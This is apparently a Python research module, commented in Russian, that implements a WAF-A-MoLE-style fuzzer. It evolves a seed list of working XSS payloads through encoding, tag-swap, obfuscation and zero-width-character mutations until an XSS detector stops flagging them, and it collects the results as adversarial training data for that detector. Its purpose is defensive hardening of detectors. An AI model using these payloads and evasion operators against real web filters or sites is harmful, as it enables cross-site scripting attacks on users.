"""
XSS-специфичный генератор обходов (guided mutational fuzzing).

Референс: WAF-A-MoLE (AvalZ) — алгоритм guided mutation с очередью по confidence,
но с XSS-специфичными операторами мутации вместо SQLi.

Схема co-training (чёрный ящик):
1. Генератор видит только ответ детектора (метку/вероятность), без градиентов
2. Применяет семантически-сохраняющие мутации к XSS-пейлоадам
3. Оракул проверяет, что мутант остаётся исполняемым XSS

Мутации:
- Смена регистра: <script> → <ScRiPt>
- Вставка комментариев: <script> → <scr<!-- -->ipt>
- Вставка пробелов/табов: <script> → <script  >
- Кодировка атрибутов: onerror → on&#101;rror
- Эквивалентные обработчики: onerror → onload, onclick → onfocus
- Подмена тегов: <script> → <svg onload>, <img onerror>
- Вставка null-байтов: <scr\x00ipt>
- Разрыв атрибутов: " → ", таб, newline
- JS-обфускация: alert() → window['alert'](), eval(atob(...))
- Псевдо-протоколы: javascript: → &#106;avascript:
- Декоративные атрибуты: <img src=x onerror=...> → <img src=x style="" onerror=...>
"""

import re
import random
import html
import urllib.parse
from typing import Callable


# XSS-пейлоады для мутаций (seed-корпус)
SEED_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src='javascript:alert(1)'>",
    "<input onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<math><mtext><table><mglyph><svg><mtext><textarea><path id='</textarea><img onerror=alert(1) src=1>'>",
    "javascript:alert(1)",
    "'-alert(1)-'",
    "\"><script>alert(1)</script>",
    "' onerror='alert(1)'",
    "<a href='javascript:alert(1)'>click</a>",
    "';alert(1);//",
    "<object data='javascript:alert(1)'>",
    "<embed src='javascript:alert(1)'>",
    "<link rel=import href='data:text/html,<script>alert(1)</script>'>",
    "<base href='javascript:alert(1)//'>",
]


# ============================================================
# Операторы мутации (XSS-специфичные)
# ============================================================

def mutate_case_swap(payload: str) -> str:
    """Смена регистра HTML-тегов и JS-ключевых слов."""
    def swap_case(match):
        s = match.group(0)
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in s)
    return re.sub(r'</?[a-zA-Z]+|on\w+=|alert|prompt|confirm|eval|document|window', 
                  swap_case, payload)


def mutate_insert_comments(payload: str) -> str:
    """Вставка HTML-комментариев внутрь тегов."""
    insertions = ['<!-- -->', '/**/', '<!>', '<!---->']
    insert = random.choice(insertions)
    # Вставляем в случайную позицию внутри <>
    def insert_in_tag(match):
        tag = match.group(0)
        if len(tag) > 3:
            pos = random.randint(2, len(tag) - 2)
            return tag[:pos] + insert + tag[pos:]
        return tag
    return re.sub(r'<[^>]+>', insert_in_tag, payload)


def mutate_insert_whitespace(payload: str) -> str:
    """Вставка пробелов, табов, переносов строк."""
    whitespace = [' ', '\t', '\n', '\r', '\x0c', '\x0b']
    ws = random.choice(whitespace)
    # Вставка после < или перед >
    if '<' in payload and '>' in payload:
        pos = payload.index('<') + 1
        return payload[:pos] + ws + payload[pos:]
    return payload + ws


def mutate_encode_entities(payload: str) -> str:
    """HTML-entity кодирование отдельных символов."""
    chars_to_encode = ['<', '>', '"', "'", '=', '(', ')', '/']
    result = payload
    for _ in range(random.randint(1, 3)):
        if not result:
            break
        char = random.choice(chars_to_encode)
        if char in result:
            encoding_type = random.choice(['decimal', 'hex', 'named'])
            if encoding_type == 'decimal':
                encoded = f'&#{ord(char)};'
            elif encoding_type == 'hex':
                encoded = f'&#x{ord(char):x};'
            else:
                encoded = html.escape(char)
            result = result.replace(char, encoded, 1)
    return result


def mutate_encode_url(payload: str) -> str:
    """URL-encoding отдельных символов."""
    chars_to_encode = list(payload)
    if not chars_to_encode:
        return payload
    for _ in range(random.randint(1, 3)):
        idx = random.randint(0, len(chars_to_encode) - 1)
        c = chars_to_encode[idx]
        if c.isalnum():
            continue
        chars_to_encode[idx] = urllib.parse.quote(c, safe='')
    return ''.join(chars_to_encode)


def mutate_swap_events(payload: str) -> str:
    """Замена обработчиков событий на эквивалентные."""
    event_swaps = {
        'onerror': ['onload', 'onfocus', 'onmouseover', 'onmouseenter', 'onanimationstart'],
        'onload': ['onerror', 'onpageshow', 'onreadystatechange'],
        'onclick': ['onfocus', 'onmousedown', 'ontouchstart', 'onpointerdown'],
        'onfocus': ['onclick', 'onfocusin', 'onmouseenter'],
        'onmouseover': ['onmouseenter', 'onmousemove', 'onpointerover'],
        'onsubmit': ['onchange', 'oninput'],
    }
    result = payload
    for event, alternatives in event_swaps.items():
        if event in result.lower():
            alt = random.choice(alternatives)
            pattern = re.compile(re.escape(event), re.IGNORECASE)
            result = pattern.sub(alt, result, count=1)
            break
    return result


def mutate_swap_tags(payload: str) -> str:
    """Подмена тегов на эквивалентные."""
    tag_swaps = {
        'script': ['svg onload', 'img src=x onerror', 'iframe', 'embed', 'object data'],
        'img': ['svg', 'video', 'input', 'marquee'],
        'svg': ['img', 'math', 'video'],
        'iframe': ['embed', 'object', 'frame'],
    }
    result = payload
    for tag, alternatives in tag_swaps.items():
        pattern = re.compile(rf'<{tag}[\s>]', re.IGNORECASE)
        if pattern.search(result):
            alt = random.choice(alternatives)
            result = pattern.sub(f'<{alt} ', result, count=1)
            break
    return result


def mutate_js_obfuscation(payload: str) -> str:
    """JS-обфускация: alert → window['al'+'ert'] и подобное."""
    obfuscations = [
        (r'\balert\b', "window['alert']"),
        (r'\balert\b', "self['alert']"),
        (r'\balert\b', "top['alert']"),
        (r'\balert\b', "this['alert']"),
        (r'\balert\s*\(([^)]*)\)', r"eval('al'+'ert(\\1)')"),
        (r'\balert\s*\(([^)]*)\)', r"setTimeout('alert(\\1)',0)"),
        (r'\balert\s*\(([^)]*)\)', r"setInterval('alert(\\1)',0)"),
    ]
    for pattern, replacement in random.sample(obfuscations, min(2, len(obfuscations))):
        result = re.sub(pattern, replacement, payload, count=1)
        if result != payload:
            return result
    return payload


def mutate_null_byte(payload: str) -> str:
    """Вставка null-байтов и zero-width символов."""
    null_chars = ['\x00', '\u200b', '\u200c', '\u200d', '\ufeff']
    null = random.choice(null_chars)
    # Вставляем внутрь ключевых слов
    keywords = ['script', 'alert', 'onerror', 'onload', 'javascript']
    for kw in keywords:
        if kw in payload.lower():
            idx = payload.lower().index(kw)
            mid = idx + len(kw) // 2
            return payload[:mid] + null + payload[mid:]
    return payload


def mutate_attr_padding(payload: str) -> str:
    """Вставка декоративных атрибутов перед опасными."""
    padding_attrs = [
        'style=""', 'class="x"', 'id="x"', 'title=""', 'lang="en"',
        'dir="ltr"', 'hidden', 'tabindex="0"', 'role="button"',
    ]
    attr = random.choice(padding_attrs)
    # Вставляем перед on*= атрибутом
    match = re.search(r'(on\w+\s*=)', payload)
    if match:
        pos = match.start()
        return payload[:pos] + attr + ' ' + payload[pos:]
    return payload


# Все операторы мутации
MUTATION_OPERATORS = [
    mutate_case_swap,
    mutate_insert_comments,
    mutate_insert_whitespace,
    mutate_encode_entities,
    mutate_encode_url,
    mutate_swap_events,
    mutate_swap_tags,
    mutate_js_obfuscation,
    mutate_null_byte,
    mutate_attr_padding,
]


# ============================================================
# Guided Mutational Fuzzing (алгоритм WAF-A-MoLE)
# ============================================================

class XSSMutator:
    """
    Guided mutational fuzzer для XSS-пейлоадов.
    
    Алгоритм (из WAF-A-MoLE):
    1. Начинаем с seed-пейлоада
    2. Генерируем N мутантов разными операторами
    3. Отправляем мутантов детектору
    4. Выбираем мутанта с максимальной вероятностью обхода (min P(XSS))
    5. Повторяем
    
    Чёрный ящик: детектор отвечает только предсказанием/вероятностью.
    """
    
    def __init__(self, 
                 detector_fn: Callable[[str], tuple[bool, float]],
                 population_size: int = 20,
                 n_iterations: int = 50,
                 n_mutations_per_payload: int = 3):
        """
        Args:
            detector_fn: функция (payload) → (is_xss, probability)
            population_size: размер популяции мутантов
            n_iterations: количество итераций
            n_mutations_per_payload: сколько мутаций применять к каждому пейлоаду
        """
        self.detector_fn = detector_fn
        self.population_size = population_size
        self.n_iterations = n_iterations
        self.n_mutations = n_mutations_per_payload
    
    def mutate(self, payload: str) -> str:
        """Применяет случайную мутацию к пейлоаду."""
        n = random.randint(1, self.n_mutations)
        result = payload
        for _ in range(n):
            operator = random.choice(MUTATION_OPERATORS)
            result = operator(result)
        return result
    
    def evolve(self, seed: str) -> dict:
        """
        Эволюция seed-пейлоада для обхода детектора.
        
        Returns:
            dict с:
            - 'best_payload': лучший мутант
            - 'best_probability': минимальная P(XSS) найденного мутанта
            - 'evasion_success': обошёл ли детектор
            - 'n_iterations': сколько итераций понадобилось
            - 'history': история эволюции
        """
        current_best = seed
        current_prob = self.detector_fn(seed)[1]
        
        history = [{
            'iteration': 0,
            'payload': seed,
            'probability': current_prob,
            'operator': 'original',
        }]
        
        # Если уже не XSS — сразу успех
        if current_prob < 0.5:
            return {
                'best_payload': seed,
                'best_probability': current_prob,
                'evasion_success': True,
                'n_iterations': 0,
                'history': history,
            }
        
        for iteration in range(1, self.n_iterations + 1):
            # Генерируем популяцию мутантов
            mutants = []
            for _ in range(self.population_size):
                mutant = self.mutate(current_best)
                mutants.append(mutant)
            
            # Оцениваем всех мутантов
            scored = []
            for mutant in mutants:
                is_xss, prob = self.detector_fn(mutant)
                scored.append((mutant, prob))
            
            # Выбираем лучшего (минимальная P(XSS))
            scored.sort(key=lambda x: x[1])
            best_mutant, best_prob = scored[0]
            
            # Обновляем лучший результат
            if best_prob < current_prob:
                current_best = best_mutant
                current_prob = best_prob
                
                history.append({
                    'iteration': iteration,
                    'payload': best_mutant,
                    'probability': best_prob,
                    'improvement': True,
                })
            else:
                history.append({
                    'iteration': iteration,
                    'payload': best_mutant,
                    'probability': best_prob,
                    'improvement': False,
                })
            
            # Проверяем обход
            if current_prob < 0.5:
                return {
                    'best_payload': current_best,
                    'best_probability': current_prob,
                    'evasion_success': True,
                    'n_iterations': iteration,
                    'history': history,
                }
        
        return {
            'best_payload': current_best,
            'best_probability': current_prob,
            'evasion_success': current_prob < 0.5,
            'n_iterations': self.n_iterations,
            'history': history,
        }
    
    def attack_from_seeds(self, seeds: list[str] | None = None) -> list[dict]:
        """
        Атака из набора seed-пейлоадов.
        
        Returns: список результатов evolve() для каждого seed.
        """
        if seeds is None:
            seeds = SEED_PAYLOADS
        
        results = []
        for i, seed in enumerate(seeds):
            print(f"  Атака {i+1}/{len(seeds)}: {seed[:50]}...")
            result = self.evolve(seed)
            results.append(result)
            status = "✅ ОБХОД" if result['evasion_success'] else "❌ НЕ ОБОЙДЁН"
            print(f"    {status} (P={result['best_probability']:.3f}, "
                  f"итераций={result['n_iterations']})")
        
        return results


def generate_evasion_dataset(detector_fn: Callable[[str], tuple[bool, float]],
                              seeds: list[str] | None = None,
                              n_samples: int = 100) -> list[dict]:
    """
    Генерирует датасет обходящих пейлоадов для дообучения детектора.
    
    Returns: список {'text': payload, 'label': 1, 'source': 'adversarial'}
    """
    mutator = XSSMutator(
        detector_fn=detector_fn,
        population_size=15,
        n_iterations=30,
    )
    
    if seeds is None:
        seeds = random.sample(SEED_PAYLOADS, min(len(SEED_PAYLOADS), n_samples // 5))
    
    results = mutator.attack_from_seeds(seeds)
    
    # Собираем обходящие пейлоады (evasion_success=True)
    evasion_payloads = []
    for result in results:
        if result['evasion_success']:
            evasion_payloads.append({
                'text': result['best_payload'],
                'label': 1,
                'source': 'adversarial',
            })
    
    print(f"\nСгенерировано {len(evasion_payloads)} обходящих пейлоадов из {len(results)} seeds")
    return evasion_payloads
